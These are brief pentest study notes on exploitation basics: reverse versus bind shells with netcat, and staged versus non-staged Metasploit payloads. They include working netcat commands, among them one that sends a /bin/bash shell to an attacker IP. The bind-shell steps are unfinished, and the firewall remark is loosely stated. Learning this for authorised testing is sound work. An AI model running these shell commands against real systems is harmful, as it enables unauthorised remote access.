# Exploitation Basics

## Reverse Shells vs Bind Shells

### netcat

- reverse shell: a victim connects to us, we executes a linux bin shell when it connects, we're listening. 95% of cases.
- bind shell: we connect to a port on the target, the victim is listening. Uesful to bypass firewalls.

Reverse shell:

1. open a port: `nc -nvlp 4444`
2. `nc 192.168.92.128 4444 -e /bin/bash`

Bind shell:

1. `nc -nvlp 4444 -e /bin/bash`
2. connect to our victim:

## Staged vs Non-Staged Payloads

- non-staged payload: sends exploit shellcode all at once (large size, won't always work) (windows/meterpreter_reverse_tcp)
- staged payload: sends in stages (can be less stable), metasploit identifies them with an extra / (windows/meterpreter/reverse_tcp)

if one type is not working, try the other one.
